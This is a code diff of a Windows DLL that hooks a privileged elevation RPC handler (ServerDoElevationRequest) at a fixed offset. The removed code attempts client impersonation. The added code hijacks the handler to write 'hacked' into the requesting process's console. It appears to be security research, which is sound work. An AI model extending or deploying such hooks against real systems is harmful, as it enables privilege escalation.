@@ -11,29 +11,27 @@ struct rpc_internal_struct {
     BYTE* data;
 };
 
-typedef void(__fastcall* fnServerDoElevationRequest_t)(RPC_BINDING_HANDLE, HANDLE, HANDLE,
+typedef unsigned long long(__fastcall* fnServerDoElevationRequest_t)(RPC_BINDING_HANDLE, HANDLE, HANDLE,
     HANDLE, int, rpc_internal_struct, rpc_internal_struct, rpc_internal_struct,
     rpc_internal_struct, GUID*, HANDLE);
 
-fnServerDoElevationRequest_t OriginalServerDoElevationRequest = NULL;
+typedef RPC_STATUS(*fnRpcServerInqCallAttributes_t)(RPC_BINDING_HANDLE, void*);
 
-void __fastcall HookedServerDoElevationRequest(RPC_BINDING_HANDLE rpcHandle,
+fnServerDoElevationRequest_t OriginalServerDoElevationRequest = NULL;
+fnRpcServerInqCallAttributes_t OriginalRpcServerInqCallAttributes = NULL;
+
+unsigned long long HookedServerDoElevationRequest(RPC_BINDING_HANDLE rpcHandle,
     HANDLE input_process_handle, HANDLE pipe_handle, HANDLE file_handle, int run_mode,
     rpc_internal_struct cmd, rpc_internal_struct param_7, rpc_internal_struct param_8,
     rpc_internal_struct param_9, GUID* input_guid, HANDLE output_process) {
-    OutputDebugStringA("Impersonation attempt.\n");
-    RPC_STATUS result = RpcImpersonateClient(rpcHandle);
-    if (result != RPC_S_OK) {
-        char debugString[100];
-        snprintf(debugString, 100, "Impersonation failed: %i\n", result);
-        OutputDebugStringA(debugString);
-    }
-    else {
-        OutputDebugStringA("Impersonation successful.\n");
-    }
-    OutputDebugStringA("Impersonation happened?.\n");
-    return;
-    return OriginalServerDoElevationRequest(rpcHandle, input_process_handle, pipe_handle, file_handle, run_mode, cmd, param_7, param_8, param_9, input_guid, output_process);
+    DWORD ppid = GetProcessId(input_process_handle);
+    FreeConsole();
+    AttachConsole(ppid);
+    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    DWORD dwLen = 0;
+    WriteConsoleA(hStdOut, "hacked\n", 7, &dwLen, NULL);
+    return 0;
+    // return OriginalServerDoElevationRequest(rpcHandle, input_process_handle, pipe_handle, file_handle, run_mode, cmd, param_7, param_8, param_9, input_guid, output_process);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
@@ -41,9 +39,9 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
         return TRUE;
     }
     HMODULE target_process_handle = GetModuleHandle(NULL);
-    OriginalServerDoElevationRequest = (fnServerDoElevationRequest_t)((uint64_t)target_process_handle + kServerDoElevationRequestOffset);
 
     if (dwReason == DLL_PROCESS_ATTACH) {
+        OriginalServerDoElevationRequest = (fnServerDoElevationRequest_t)((uint64_t)target_process_handle + kServerDoElevationRequestOffset);
         HMODULE target_process_handle = GetModuleHandle(NULL);
         char* debugOutput = (char*)malloc(256);
         snprintf(debugOutput, 256, "Got Module Handle %p\n", (void*)target_process_handle);
